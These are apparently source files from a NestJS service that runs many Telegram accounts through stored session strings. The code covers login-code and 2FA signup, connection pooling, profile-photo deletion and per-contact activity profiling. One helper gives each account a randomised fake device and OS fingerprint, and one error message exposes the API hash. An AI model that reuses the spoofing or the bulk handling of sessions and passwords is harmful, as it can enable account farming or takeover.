interface AdminInfo {\r\n    userId: string;\r\n    rank?: string;\r\n    permissions: AdminPermissions;\r\n}\r\n\r\nexport interface AdminPermissions {\r\n    changeInfo: boolean;\r\n    postMessages: boolean;\r\n    editMessages: boolean;\r\n    deleteMessages: boolean;\r\n    banUsers: boolean;\r\n    inviteUsers: boolean;\r\n    pinMessages: boolean;\r\n    addAdmins: boolean;\r\n    anonymous: boolean;\r\n    manageCall: boolean;\r\n}\r\n\r\nexport interface BannedUserInfo {\r\n    userId: string;\r\n    bannedRights: BannedRights;\r\n}\r\n\r\nexport interface BannedRights {\r\n    viewMessages: boolean;\r\n    sendMessages: boolean;\r\n    sendMedia: boolean;\r\n    sendStickers: boolean;\r\n    sendGifs: boolean;\r\n    sendGames: boolean;\r\n    sendInline: boolean;\r\n    embedLinks: boolean;\r\n    untilDate: number;\r\n}\r\n\r\nexport interface ContactStats {\r\n    total: number;\r\n    online: number;\r\n    withPhone: number;\r\n    mutual: number;\r\n    lastWeekActive: number;\r\n}\r\n\r\nexport interface ImportContactResult {\r\n    success: boolean;\r\n    phone: string;\r\n    error?: string;\r\n}\r\n\r\nexport interface BlockListResult {\r\n    success: boolean;\r\n    userId: string;\r\n    error?: string;\r\n}\r\n\r\nexport interface ChatFolder {\r\n    id: number;\r\n    title: string;\r\n    includedChatsCount: number;\r\n    excludedChatsCount: number;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    uniqueSenders: number;\r\n    messageTypes: MessageTypeCounts;\r\n    topSenders: TopSenderInfo[];\r\n    mostActiveHours: Array<{ hour: number; count: number }>;\r\n}\r\n\r\nexport interface MessageTypeCounts {\r\n    text: number;\r\n    photo: number;\r\n    video: number;\r\n    voice: number;\r\n    other: number;\r\n}\r\n\r\nexport interface MessageStats {\r\n    total: number;\r\n    withMedia: number;\r\n    withLinks: number;\r\n    withForwards: number;\r\n    byHour: number[];\r\n    byType: Record<string, number>;\r\n}\r\n\r\nexport interface TopPrivateChat {\r\n    chatId: string;\r\n    username?: string;\r\n    firstName?: string;\r\n    lastName?: string;\r\n    totalMessages: number;\r\n    interactionScore: number;\r\n    engagementLevel: 'recent' | 'active' | 'dormant';\r\n    lastActivityDays: number;\r\n    calls: CallBreakdown;\r\n    media: MediaBreakdown;\r\n    activityBreakdown: ActivityBreakdown;\r\n}\r\n\r\nexport interface CallBreakdown {\r\n    total: number;\r\n    incoming: { total: number; audio: number; video: number };\r\n    outgoing: { total: number; audio: number; video: number };\r\n}\r\n\r\nexport interface MediaBreakdown {\r\n    photos: number;\r\n    videos: number;\r\n    photosByUs: number;\r\n    photosByThem: number;\r\n    videosByUs: number;\r\n    videosByThem: number;\r\n}\r\n\r\nexport interface ActivityBreakdown {\r\n    videoCalls: number;\r\n    audioCalls: number;\r\n    mediaSharing: number;\r\n    textMessages: number;\r\n}\r\n\r\nexport interface EngagementWeights {\r\n    videoCall: number;\r\n    incomingCall: number;\r\n    outgoingCall: number;\r\n    sharedVideo: number;\r\n    sharedPhoto: number;\r\n    textMessage: number;\r\n    unreadMessages: number;\r\n}\r\n\r\nexport interface PerChatCallStats {\r\n    outgoing: number;\r\n    incoming: number;\r\n    video: number;\r\n    total: number;\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n    media?: {\r\n        type: 'photo' | 'video' | 'document';\r\n        url: string;\r\n    };\r\n}\r\n\r\nexport type PrivacyLevel = 'everybody' | 'contacts' | 'nobody';\r\n\r\nexport interface PrivacyBatchSettings {\r\n    phoneNumber?: PrivacyLevel;\r\n    lastSeen?: PrivacyLevel;\r\n    profilePhotos?: PrivacyLevel;\r\n    forwards?: PrivacyLevel;\r\n    calls?: PrivacyLevel;\r\n    groups?: PrivacyLevel;\r\n}\r\n\r\nexport interface BotCreationResult {\r\n    botToken: string;\r\n    username: string;\r\n}\r\n\r\nexport interface AlbumSendResult {\r\n    success: number;\r\n    failed: number;\r\n    errors?: Array<{ index: number; error: string }>;\r\n}\r\n\r\nexport interface MediaQueryParams {\r\n    chatId: string;\r\n    types?: ('photo' | 'video' | 'document' | 'voice' | 'all')[];\r\n    startDate?: Date;\r\n    endDate?: Date;\r\n    limit?: number;\r\n    maxId?: number;\r\n    minId?: number;\r\n}\r\n\r\nexport interface CleanupOptions {\r\n    chatId: string;\r\n    beforeDate?: Date;\r\n    onlyMedia?: boolean;\r\n    excludePinned?: boolean;\r\n    revoke?: boolean;\r\n}\r\n\r\nexport interface EditMessageOptions {\r\n    chatId: string;\r\n    messageId: number;\r\n    text?: string;\r\n    media?: {\r\n        type: 'photo' | 'video' | 'document';\r\n        url: string;\r\n    };\r\n}\r\n\r\nexport interface MediaBatchOptions {\r\n    chatId: string;\r\n    media: Array<{\r\n        type: 'photo' | 'video' | 'document';\r\n        url: string;\r\n        caption?: string;\r\n        fileName?: string;\r\n    }>;\r\n    silent?: boolean;\r\n    scheduleDate?: number;\r\n}\r\n\r\nexport interface ChatSettingsUpdate {\r\n    chatId: string;\r\n    username?: string;\r\n    title?: string;\r\n    about?: string;\r\n    photo?: string;\r\n    slowMode?: number;\r\n    linkedChat?: string;\r\n    defaultSendAs?: string;\r\n}\r\n\r\nexport interface GroupSettingsUpdate {\r\n    groupId: string;\r\n    title?: string;\r\n    description?: string;\r\n    slowMode?: number;\r\n    memberRestrictions?: Record<string, boolean>;\r\n    username?: string;\r\n}\r\n\r\nexport interface TerminateSessionOptions {\r\n    hash: string;\r\n    type: 'app' | 'web';\r\n    exceptCurrent?: boolean;\r\n}\r\n\r\nexport interface DeleteChatParams {\r\n    peer: string | Api.TypeInputPeer;\r\n    maxId?: number;\r\n    justClear?: boolean;\r\n    revoke?: boolean;\r\n    minDate?: number;\r\n    maxDate?: number;\r\n}\r\n\r\nexport interface BotCreationOptions {\r\n    name: string;\r\n    username: string;\r\n    description?: string;\r\n    aboutText?: string;\r\n    profilePhotoUrl?: string;\r\n}\r\n\r\nexport interface ChatFolderCreateOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}\r\n\r\nexport interface VoiceMessageOptions {\r\n    chatId: string;\r\n    url: string;\r\n    duration?: number;\r\n    caption?: string;\r\n}\r\n\r\n// ---- Standardized frontend DTOs ----\r\n\r\nexport interface SenderInfo {\r\n    id: string;\r\n    firstName: string | null;\r\n    lastName: string | null;\r\n    username: string | null;\r\n    phone: string | null;\r\n    isSelf: boolean;\r\n    peerType: 'user' | 'group' | 'channel' | 'unknown';\r\n}\r\n\r\nexport interface MediaInfo {\r\n    type: string;\r\n    thumbnail: string | null;\r\n    mimeType: string | null;\r\n    fileName: string | null;\r\n    fileSize: number | null;\r\n    width: number | null;\r\n    height: number | null;\r\n    duration: number | null;\r\n}\r\n\r\nexport interface MessageReactionItem {\r\n    reaction: string;\r\n    count: number;\r\n}\r\n\r\nexport interface MessageItem {\r\n    id: number;\r\n    text: string;\r\n    date: string;\r\n    time: string;\r\n    dateUnix: number;\r\n    senderId: string;\r\n    media: MediaInfo | null;\r\n    isEdited: boolean;\r\n    editDate: string | null;\r\n    isPinned: boolean;\r\n    isForwarded: boolean;\r\n    forwardedFrom: string | null;\r\n    replyToMessageId: number | null;\r\n    groupedId: string | null;\r\n    views: number | null;\r\n    forwards: number | null;\r\n    reactions: MessageReactionItem[] | null;\r\n}\r\n\r\nexport interface ScheduledMessageItem {\r\n    id: number;\r\n    text: string;\r\n    scheduledDate: string;\r\n    media: MediaInfo | null;\r\n    chatId: string;\r\n}\r\n\r\nexport interface TopSenderInfo {\r\n    id: string;\r\n    name: string;\r\n    username: string | null;\r\n    count: number;\r\n}\r\n\r\nexport interface SearchMessageItem {\r\n    id: number;\r\n    text: string;\r\n    date: string;\r\n    chatId: string;\r\n    senderName: string | null;\r\n    mediaType: string | null;\r\n}\r\n","import TelegramManager from '../TelegramManager';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport { TelegramLogger } from './telegram-logger';\r\nimport { BadRequestException, InternalServerErrorException, NotFoundException } from '@nestjs/common';\r\nimport { UsersService } from '../../../components/users/users.service';\r\nimport { ConnectionStatusDto } from '../dto/connection-management.dto';\r\nimport { withTimeout } from '../../../utils/withTimeout';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { getBotsServiceInstance } from '../../../utils';\r\nimport { ChannelCategory } from '../../../components/bots/bots.service';\r\nimport isPermanentError from '../../../utils/isPermanentError';\r\n\r\ninterface User {\r\n    mobile: string;\r\n    session: string;\r\n    tgId?: string;\r\n}\r\n\r\ninterface ClientInfo {\r\n    client: TelegramManager;\r\n    lastUsed: number;\r\n    autoDisconnect: boolean;\r\n    state: 'connecting' | 'connected' | 'disconnected' | 'error';\r\n    connectionAttempts: number;\r\n    lastError?: string;\r\n}\r\n\r\ninterface GetClientOptions {\r\n    autoDisconnect?: boolean;\r\n    handler?: boolean;\r\n    timeout?: number;\r\n    forceReconnect?: boolean;\r\n}\r\n\r\nclass ConnectionManager {\r\n    private static instance: ConnectionManager | null = null;\r\n    private clients = new Map<string, ClientInfo>();\r\n    private logger = new TelegramLogger('ConnectionManager');\r\n    private cleanupTimer: NodeJS.Timeout | null = null;\r\n    private usersService: UsersService | null = null;\r\n    private isShuttingDown = false;\r\n\r\n    // Configuration\r\n    private readonly MAX_CONNECTIONS = 50;\r\n    private readonly IDLE_TIMEOUT = 300000; // 5 minutes\r\n    private readonly CLEANUP_INTERVAL = 60000; // 1 minute\r\n    private readonly MAX_RETRY_ATTEMPTS = 3;\r\n\r\n    private constructor() {\r\n        this.startCleanup();\r\n    }\r\n\r\n    public static getInstance(): ConnectionManager {\r\n        if (!ConnectionManager.instance) {\r\n            ConnectionManager.instance = new ConnectionManager();\r\n        }\r\n        return ConnectionManager.instance;\r\n    }\r\n\r\n    public setUsersService(usersService: UsersService): void {\r\n        this.usersService = usersService;\r\n    }\r\n\r\n    public async getClient(mobile: string, options: GetClientOptions = {}): Promise<TelegramManager> {\r\n        if (!mobile) {\r\n            throw new BadRequestException('Mobile number required');\r\n        }\r\n\r\n        if (this.isShuttingDown) {\r\n            throw new InternalServerErrorException('Manager is shutting down');\r\n        }\r\n\r\n        if (this.clients.size >= this.MAX_CONNECTIONS) {\r\n            await this.forceCleanup();\r\n            if (this.clients.size >= this.MAX_CONNECTIONS) {\r\n                throw new InternalServerErrorException('Connection limit reached');\r\n            }\r\n        }\r\n\r\n        const { autoDisconnect = true, handler = true, forceReconnect = false } = options;\r\n\r\n        const connectPromise = (async () => {\r\n            try {\r\n                const existingClient = this.clients.get(mobile);\r\n                if (existingClient && !forceReconnect) {\r\n                    if (existingClient.state === 'connected' && this.isClientHealthy(existingClient)) {\r\n                        this.updateLastUsed(mobile);\r\n                        this.logger.info(mobile, 'Reusing healthy client');\r\n                        return existingClient.client;\r\n                    }\r\n                }\r\n\r\n                // Clean up old client if exists\r\n                if (existingClient) {\r\n                    this.logger.info(mobile, 'Cleaning up old client');\r\n                    await this.unregisterClient(mobile);\r\n                    await sleep(3000);\r\n                }\r\n\r\n                return await this.createNewClient(mobile, { autoDisconnect, handler });\r\n            } catch (error) {\r\n                this.logger.error(mobile, 'getClient error', error);\r\n                throw error;\r\n            }\r\n        })();\r\n        return await connectPromise;\r\n    }\r\n\r\n    private async createNewClient(mobile: string, options: { autoDisconnect: boolean; handler: boolean }): Promise<TelegramManager> {\r\n        if (!this.usersService) {\r\n            throw new InternalServerErrorException('UsersService not initialized');\r\n        }\r\n\r\n        this.logger.info(mobile, 'Creating new client', options);\r\n\r\n        // Get user data\r\n        const users = await this.usersService.search({ mobile });\r\n        const user = users[0] as User;\r\n        if (!user) {\r\n            throw new NotFoundException(`[Connection Manager]\\nUser not found : ${mobile}`);\r\n        }\r\n\r\n        const telegramManager = new TelegramManager(user.session, user.mobile);\r\n\r\n        // Initialize client info\r\n        const clientInfo: ClientInfo = {\r\n            client: telegramManager,\r\n            lastUsed: Date.now(),\r\n            autoDisconnect: options.autoDisconnect,\r\n            state: 'connecting',\r\n            connectionAttempts: 1\r\n        };\r\n\r\n        this.clients.set(mobile, clientInfo);\r\n\r\n        try {\r\n            // Create client with timeout\r\n            await telegramManager.createClient(options.handler);\r\n            \r\n            // Wait a bit for client to stabilize\r\n            await sleep(500);\r\n            \r\n            // Verify client was actually created\r\n            if (!telegramManager.client) {\r\n                throw new Error(`Client creation failed - client is null after createClient() for ${mobile}`);\r\n            }\r\n            \r\n            // Validate connection\r\n            await this.validateConnection(mobile, telegramManager);\r\n\r\n            // Update client state\r\n            clientInfo.state = 'connected';\r\n            clientInfo.connectionAttempts = 1;\r\n            delete clientInfo.lastError;\r\n            this.clients.set(mobile, clientInfo);\r\n            return telegramManager;\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Client creation failed', error);\r\n            await this.handleConnectionError(mobile, clientInfo, error as Error);\r\n            await this.unregisterClient(mobile);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    private async validateConnection(mobile: string, client: TelegramManager): Promise<void> {\r\n        if (!client) {\r\n            throw new Error(\"TelegramManager instance not initialized\");\r\n        }\r\n        \r\n        if (!client.client) {\r\n            throw new Error(`Client not initialized for ${mobile} - createClient may have failed`);\r\n        }\r\n        \r\n        if (!client.client.connected) {\r\n            throw new Error(`Client not connected for ${mobile}`);\r\n        }\r\n        \r\n        await withTimeout(() => client.client.getMe(), {\r\n            errorMessage: `getMe TimeOut for ${mobile}\\napiId: ${client.apiId}\\napiHash:${client.apiHash}`,\r\n            maxRetries: 3,\r\n            throwErr: true\r\n        });\r\n    }\r\n\r\n    private isClientHealthy(clientInfo: ClientInfo): boolean {\r\n        const now = Date.now();\r\n        const isConnected = clientInfo.client?.connected() === true;\r\n        const isNotStale = (now - clientInfo.lastUsed) < this.IDLE_TIMEOUT;\r\n        const hasNoErrors = clientInfo.state === 'connected' && !clientInfo.lastError;\r\n\r\n        return isConnected && isNotStale && hasNoErrors;\r\n    }\r\n\r\n    private async handleConnectionError(mobile: string, clientInfo: ClientInfo, error: Error): Promise<void> {\r\n        clientInfo.lastError = error.message;\r\n        clientInfo.state = 'error';\r\n        this.clients.set(mobile, clientInfo);\r\n\r\n        const errorDetails = parseError(error, mobile, false);\r\n        let markedAsExpired: boolean = false;\r\n        // Handle permanent failures\r\n        if (isPermanentError(errorDetails)) {\r\n            this.logger.info(mobile, 'Marking user as expired due to permanent error');\r\n            try {\r\n                const users = await this.usersService!.search({ mobile });\r\n                const user = users[0] as User;\r\n                if (user) {\r\n                    await this.usersService!.updateByFilter(\r\n                        { $or: [{ tgId: user.tgId }, { mobile: mobile }] },\r\n                        { expired: true }\r\n                    );\r\n                    markedAsExpired = true;\r\n                }\r\n            } catch (updateError) {\r\n                this.logger.error(mobile, 'Failed to mark user as expired', updateError);\r\n            }\r\n        }\r\n\r\n        try {\r\n            const botsService = getBotsServiceInstance();\r\n            if (botsService) {\r\n                const botMessage = `Client connection error for ${mobile}\\n\\n${errorDetails.message}\\n\\nMarkedAsExpired: ${markedAsExpired}`;\r\n                await botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGIN_FAILURES, botMessage);\r\n            }\r\n        } catch (notificationError) {\r\n            this.logger.error(mobile, 'Failed to send error notification', notificationError);\r\n        }\r\n    }\r\n\r\n    public async unregisterClient(mobile: string): Promise<void> {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (!clientInfo) return;\r\n\r\n        // this.logger.info(mobile, 'Removing client', { state: clientInfo.state });\r\n\r\n        try {\r\n            clientInfo.state = 'disconnected';\r\n\r\n            await withTimeout(() => clientInfo.client.destroy(), {\r\n                timeout: 30000,\r\n                errorMessage: \"Client destroy timeout\"\r\n            });\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Error destroying client', error);\r\n        } finally {\r\n            this.clients.delete(mobile);\r\n            // this.logger.info(mobile, 'Client removed from registry');\r\n        }\r\n    }\r\n\r\n    private updateLastUsed(mobile: string): void {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (clientInfo) {\r\n            clientInfo.lastUsed = Date.now();\r\n            this.clients.set(mobile, clientInfo);\r\n        }\r\n    }\r\n\r\n    public hasClient(mobile: string): boolean {\r\n        const clientInfo = this.clients.get(mobile);\r\n        return clientInfo !== undefined && clientInfo.state === 'connected';\r\n    }\r\n\r\n    public getClientState(mobile: string): ConnectionStatusDto | undefined {\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (!clientInfo) return undefined;\r\n\r\n        return {\r\n            autoDisconnect: clientInfo.autoDisconnect,\r\n            connectionAttempts: clientInfo.connectionAttempts,\r\n            lastUsed: clientInfo.lastUsed,\r\n            state: clientInfo.state,\r\n            lastError: clientInfo.lastError\r\n        };\r\n    }\r\n\r\n    public getConnectionStats(): {\r\n        total: number;\r\n        connected: number;\r\n        connecting: number;\r\n        disconnected: number;\r\n        error: number;\r\n    } {\r\n        const stats = {\r\n            total: this.clients.size,\r\n            connected: 0,\r\n            connecting: 0,\r\n            disconnected: 0,\r\n            error: 0\r\n        };\r\n\r\n        for (const client of this.clients.values()) {\r\n            stats[client.state]++;\r\n        }\r\n\r\n        return stats;\r\n    }\r\n\r\n    private async cleanup(): Promise<void> {\r\n        if (this.isShuttingDown) return;\r\n\r\n        const now = Date.now();\r\n        const toRemove: string[] = [];\r\n\r\n        // this.logger.info('ConnectionManager', `Starting cleanup - ${this.clients.size} clients`);\r\n\r\n        for (const [mobile, clientInfo] of this.clients.entries()) {\r\n            const isIdle = (now - clientInfo.lastUsed) > this.IDLE_TIMEOUT;\r\n            const shouldAutoDisconnect = clientInfo.autoDisconnect && isIdle;\r\n            const isStale = (now - clientInfo.lastUsed) > (this.IDLE_TIMEOUT * 2);\r\n            const isErrored = clientInfo.state === 'error';\r\n            const tooManyAttempts = clientInfo.connectionAttempts >= this.MAX_RETRY_ATTEMPTS;\r\n\r\n            if (shouldAutoDisconnect || isStale || isErrored || tooManyAttempts) {\r\n                this.logger.info(mobile, 'Marking for cleanup', {\r\n                    shouldAutoDisconnect,\r\n                    isStale,\r\n                    isErrored,\r\n                    tooManyAttempts,\r\n                    idleTime: now - clientInfo.lastUsed\r\n                });\r\n                toRemove.push(mobile);\r\n            }\r\n        }\r\n\r\n        // Remove clients in parallel with limit\r\n        const removePromises = toRemove.slice(0, 10).map(mobile =>\r\n            this.unregisterClient(mobile).catch(error =>\r\n                this.logger.error(mobile, 'Cleanup removal failed', error)\r\n            )\r\n        );\r\n\r\n        if (removePromises.length > 0) {\r\n            await Promise.allSettled(removePromises);\r\n            this.logger.info('Default', `Cleanup completed - removed ${removePromises.length} clients`);\r\n        }\r\n    }\r\n\r\n    private async forceCleanup(): Promise<void> {\r\n        this.logger.info('Default', 'Force cleanup triggered');\r\n\r\n        const oldestClients = Array.from(this.clients.entries())\r\n            .sort(([, a], [, b]) => a.lastUsed - b.lastUsed)\r\n            .slice(0, Math.ceil(this.MAX_CONNECTIONS * 0.2)) // Remove 20% of oldest\r\n            .map(([mobile]) => mobile);\r\n\r\n        for (const mobile of oldestClients) {\r\n            await this.unregisterClient(mobile);\r\n        }\r\n\r\n        this.logger.info('Default', `Force cleanup completed - removed ${oldestClients.length} clients`);\r\n    }\r\n\r\n    public async forceReconnect(mobile: string): Promise<TelegramManager> {\r\n        this.logger.info(mobile, 'Force reconnect requested');\r\n        await this.unregisterClient(mobile);\r\n        return this.getClient(mobile, { forceReconnect: true });\r\n    }\r\n\r\n    private startCleanup(): void {\r\n        if (this.cleanupTimer) return;\r\n\r\n        this.cleanupTimer = setInterval(() => {\r\n            this.cleanup().catch(error =>\r\n                this.logger.error('Default', 'Cleanup error', error)\r\n            );\r\n        }, this.CLEANUP_INTERVAL);\r\n\r\n        this.logger.info('Default', `Cleanup started - ${this.CLEANUP_INTERVAL}ms interval`);\r\n    }\r\n\r\n    private stopCleanup(): void {\r\n        if (this.cleanupTimer) {\r\n            clearInterval(this.cleanupTimer);\r\n            this.cleanupTimer = null;\r\n            // this.logger.info('Default', 'Cleanup stopped');\r\n        }\r\n    }\r\n\r\n    public async shutdown(): Promise<void> {\r\n        // this.logger.info('Default', 'Shutdown initiated');\r\n        this.isShuttingDown = true;\r\n        this.stopCleanup();\r\n\r\n        // Disconnect all clients\r\n        await this.disconnectAll();\r\n        this.clients.clear();\r\n        // this.logger.info('Default', 'Shutdown completed');\r\n    }\r\n\r\n    public async disconnectAll() {\r\n        const disconnectPromises = Array.from(this.clients.keys()).map(mobile =>\r\n            this.unregisterClient(mobile).catch(error =>\r\n                this.logger.error(mobile, 'Shutdown disconnect failed', error)\r\n            )\r\n        );\r\n\r\n        await Promise.allSettled(disconnectPromises);\r\n    }\r\n\r\n    // Utility methods for monitoring\r\n    public getActiveConnectionCount(): number {\r\n        return Array.from(this.clients.values())\r\n            .filter(client => client.state === 'connected').length;\r\n    }\r\n\r\n    public getClientList(): string[] {\r\n        return Array.from(this.clients.keys());\r\n    }\r\n\r\n    public getHealthReport(): {\r\n        totalClients: number;\r\n        healthyClients: number;\r\n        unhealthyClients: string[];\r\n        memoryUsage: number;\r\n    } {\r\n        const unhealthyClients: string[] = [];\r\n        let healthyCount = 0;\r\n\r\n        for (const [mobile, clientInfo] of this.clients.entries()) {\r\n            if (this.isClientHealthy(clientInfo)) {\r\n                healthyCount++;\r\n            } else {\r\n                unhealthyClients.push(mobile);\r\n            }\r\n        }\r\n\r\n        return {\r\n            totalClients: this.clients.size,\r\n            healthyClients: healthyCount,\r\n            unhealthyClients,\r\n            memoryUsage: process.memoryUsage().heapUsed\r\n        };\r\n    }\r\n}\r\n\r\nexport const connectionManager = ConnectionManager.getInstance();\r\n\r\nexport async function unregisterClient(mobile: string) {\r\n    await connectionManager.unregisterClient(mobile)\r\n}","import { Api, TelegramClient } from \"telegram\";\n\nexport async function deleteProfilePhotos(client: TelegramClient, photos?: Api.TypePhoto[]) {\n    try {\n        if (!photos) {\n            const result = await client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.info(`Profile Pics found: ${result.photos.length}`)\n            photos = result?.photos;\n        }\n        if (photos?.length > 0) {\n            await client.invoke(\n                new Api.photos.DeletePhotos({\n                    id: <Api.TypeInputPhoto[]><unknown>photos\n                }))\n        }\n        console.info(\"Deleted profile Photos\");\n    } catch (error) {\n        throw error\n    }\n}","import { TelegramClientParams } from \"telegram/client/telegramBaseClient\";\nimport { RedisClient } from \"../../../utils/redisClient\";\nimport { Logger } from \"../../../utils/logger\";\nconst logger = new Logger(__filename);\n// Constants\nconst DEVICE_MODELS = [\n  \"Pixel 6\", \"iPhone 13\", \"Samsung Galaxy S22\", \"Redmi Note 12\",\n  \"OnePlus 9\", \"Desktop\", \"MacBook Pro\", \"iPad Pro\"\n];\n\nconst SYSTEM_VERSIONS = [\n  \"Android 13\", \"iOS 16.6\", \"Windows 10\", \"Windows 11\",\n  \"macOS 13.5\", \"Ubuntu 22.04\", \"Arch Linux\"\n];\n\nconst APP_VERSIONS = [\"1.0.0\", \"2.1.3\", \"3.5.7\", \"4.0.2\", \"5.0.0\"];\n\n// Helper\nfunction pickRandom<T>(arr: T[]): T {\n  return arr[Math.floor(Math.random() * arr.length)];\n}\n\n/**\n * Generates or fetches a persistent TG config per mobile.\n * \n * @param mobile - Mobile number or unique identifier for the client.\n * @param ttl - Time to live for the config in seconds.\n */\nexport async function generateTGConfig(mobile: string, ttl: number = 60 * 60 * 24 * 60): Promise<TelegramClientParams> {\n  const redisKey = `tg:config:${mobile}`;\n\n  const commonConfig: TelegramClientParams = {\n    connectionRetries: 10,\n    requestRetries: 5,\n    retryDelay: 2000,\n    timeout: 30,\n    autoReconnect: true,\n    maxConcurrentDownloads: 3,\n    downloadRetries: 5,\n    // Optional flags:\n    useWSS: false,\n    useIPV6: false,\n  };\n\n  // Try to fetch from Redis\n  const cached = await RedisClient.getObject<TelegramClientParams>(redisKey);\n  if (cached) {\n    return {\n      ...cached,\n      ...commonConfig\n    };\n  }\n\n  const variableConfig = {\n    deviceModel: `${pickRandom(DEVICE_MODELS)}-ssk`,\n    systemVersion: pickRandom(SYSTEM_VERSIONS),\n    appVersion: pickRandom(APP_VERSIONS),\n  }\n  // Store in Redis with no expiry (or set TTL if desired)\n  await RedisClient.set(redisKey, variableConfig, ttl);\n\n  return {\n    ...commonConfig,\n    ...variableConfig\n  };\n}\n","import { Api, TelegramClient } from \"telegram\";\nimport { EntityLike } from \"telegram/define\";\n\nexport async function getProfilePics(client: TelegramClient, user: EntityLike = \"me\") {\n    const userPhotos = await client.invoke(new Api.photos.GetUserPhotos({ userId: user }));\n    return userPhotos?.photos\n}","export class RateLimiter {\r\n    private timestamps: Map<string, number[]> = new Map();\r\n    private readonly windowMs: number;\r\n    private readonly maxRequests: number;\r\n\r\n    constructor(windowMs: number, maxRequests: number) {\r\n        this.windowMs = windowMs;\r\n        this.maxRequests = maxRequests;\r\n    }\r\n\r\n    async checkRateLimit(key: string): Promise<boolean> {\r\n        const now = Date.now();\r\n        const timestamps = this.timestamps.get(key) || [];\r\n        \r\n        // Remove timestamps outside the window\r\n        const validTimestamps = timestamps.filter(\r\n            timestamp => now - timestamp < this.windowMs\r\n        );\r\n\r\n        if (validTimestamps.length >= this.maxRequests) {\r\n            return false;\r\n        }\r\n\r\n        validTimestamps.push(now);\r\n        this.timestamps.set(key, validTimestamps);\r\n        return true;\r\n    }\r\n\r\n    async waitForRateLimit(key: string): Promise<void> {\r\n        while (!(await this.checkRateLimit(key))) {\r\n            await new Promise(resolve => setTimeout(resolve, 1000));\r\n        }\r\n    }\r\n\r\n    resetLimit(key: string): void {\r\n        this.timestamps.delete(key);\r\n    }\r\n}","import { Logger } from \"../../../utils\";\r\n\r\nexport class TelegramLogger {\r\n    private logger: Logger;\r\n\r\n    constructor(serviceName: string = 'TelegramService') {\r\n        this.logger = new Logger(serviceName);\r\n    }\r\n\r\n    info(mobile: string, operation: string, details?: any): void {\r\n        this.logger.log(`[${mobile}] ${operation}`, details);\r\n    }\r\n\r\n    error(mobile: string, operation: string, error: any): void {\r\n        this.logger.error(\r\n            `[${mobile}] ${operation} - ${error.message}`,\r\n            error.stack\r\n        );\r\n    }\r\n\r\n    warn(mobile: string, message: string, details?: any): void {\r\n        this.logger.warn(`[${mobile}] ${message}`, details);\r\n    }\r\n\r\n    debug(mobile: string, message: string, details?: any): void {\r\n        this.logger.debug(`[${mobile}] ${message}`, details);\r\n    }\r\n\r\n    verbose(mobile: string, message: string, details?: any): void {\r\n        this.logger.verbose(`[${mobile}] ${message}`, details);\r\n    }\r\n\r\n    log(mobile: string, message: string, details?: any): void {\r\n        this.logger.log(`[${mobile}] ${message}`, details);\r\n    }\r\n}","export * from './tg-signup.dto';\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","export * from './dto';\nexport * from './tg-signup.controller';\nexport * from './tg-signup.module';\nexport * from './tg-signup.service';","import { Controller, Post, Body, HttpStatus } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\nimport { TgSignupService } from './tg-signup.service';\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\nimport { Logger } from 